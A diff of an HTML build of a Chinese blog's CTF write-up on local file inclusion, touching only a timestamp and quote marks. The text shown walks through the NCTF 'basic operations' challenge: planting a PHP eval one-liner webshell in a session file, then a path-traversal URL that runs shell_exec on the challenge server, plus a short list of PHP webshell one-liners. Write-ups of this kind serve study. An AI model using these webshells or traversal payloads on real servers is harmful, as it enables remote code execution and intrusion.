@@ -91,7 +91,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2018/11/29/文件包含漏洞/1.png">
 <meta property="og:image" content="http://yoursite.com/2018/11/29/文件包含漏洞/2.png">
-<meta property="og:updated_time" content="2018-11-30T08:10:09.215Z">
+<meta property="og:updated_time" content="2018-11-30T08:12:05.094Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件包含漏洞">
 <meta name="twitter:description" content="文件包含漏洞（NCTF Web题‘基本操作’）又是一次毫无游戏体验的ctf，留下没技术的泪水，还是乖乖复现补题吧。 本地文件包含（恶意代码执行或者敏感信息泄露）探查路径遍历漏洞漏洞产生的原因是因为攻击者可以将路径遍历序列放入文件名内，从指定的文件目录向上回溯，从而访问服务器上的文件。路径遍历序列叫做“../”   1.包含目录文件?targent=test.txt如果里面的内容是php，则内容会被">
@@ -439,7 +439,7 @@
 <h3 id="3-包含session文件"><a href="#3-包含session文件" class="headerlink" title="3.包含session文件"></a>3.包含session文件</h3><p>session中的内容可以被控制，传入恶意代码。<br>session的存储位置可以获取。</p>
 <ol>
 <li>通过phpinfo的信息可以获取到session的存储位置。<br><img src="/2018/11/29/文件包含漏洞/2.png" alt=" "></li>
-<li>通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存<h3 id="本题复现"><a href="#本题复现" class="headerlink" title="本题复现"></a>本题复现</h3>登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;”  留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造<a href="http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22)列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。" target="_blank" rel="noopener">http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22)列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。</a><h4 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h4>查看php的shell信息：&lt;?php phpinfo();exit;?&gt;<br>eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;<br>&lt;?php @eval($_POST[‘c’]);?&gt;  </li>
+<li>通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存<h3 id="本题复现"><a href="#本题复现" class="headerlink" title="本题复现"></a>本题复现</h3>登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;”  留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造‘<a href="http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22)’列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。" target="_blank" rel="noopener">http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22)’列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。</a><h4 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h4>查看php的shell信息：&lt;?php phpinfo();exit;?&gt;<br>eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;<br>&lt;?php @eval($_POST[‘c’]);?&gt;  </li>
 </ol>
 
       
